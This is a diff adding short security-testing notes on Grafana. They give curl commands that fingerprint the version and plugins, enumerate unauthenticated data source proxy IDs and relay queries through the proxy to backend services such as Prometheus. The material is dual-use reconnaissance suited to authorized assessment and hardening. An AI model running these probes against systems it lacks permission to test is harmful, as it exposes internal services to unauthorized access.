@@ -1,0 +1,38 @@
+Health API: Returns health information about Grafana (version info)
+=====================================================================================
+	https://grafana.com/docs/http_api/other
+
+	curl -s https://<host>:<port>/api/health | jq
+
+List Installed/Enabled plugins and versions:
+=====================================================================================
+
+	curl -s https://<host>:<port>/api/plugins | jq
+
+Unauthenticated proxy data sources (proxy requests to other services):
+=====================================================================================
+	https://grafana.com/docs/grafana/latest/installation/security
+
+	"If you run non-Grafana web services on your Grafana server or within its local network,
+	then they might be vulnerable to exploitation through the Grafana data source proxy"
+
+* Testing for Unauthenticated data sources (enumerate <id>)
+
+	https://<host>:<port>/api/datasources/proxy/<id>
+
+	- Found:
+		curl 'https://<host>:<port>/api/datasources/proxy/0/'
+		<a href="/graph">Found</a>
+
+	- Not Found:
+		curl 'https://<host>:<port>/api/datasources/proxy/1/'
+		{"message":"Unable to load datasource meta data"}
+
+* Make request through Grafana to that datasource (Prometheus, Influxdb, Graphite, mysql, etc..)
+
+	curl https://<host>:<port>/api/datasources/proxy/<id>/graph
+	curl https://<host>:<port>/api/datasources/proxy/<id>/api/v1/query?query=[.....]
+
+* List of supported plugins
+	https://grafana.com/grafana/plugins?orderBy=weight&direction=asc&type=datasource
+
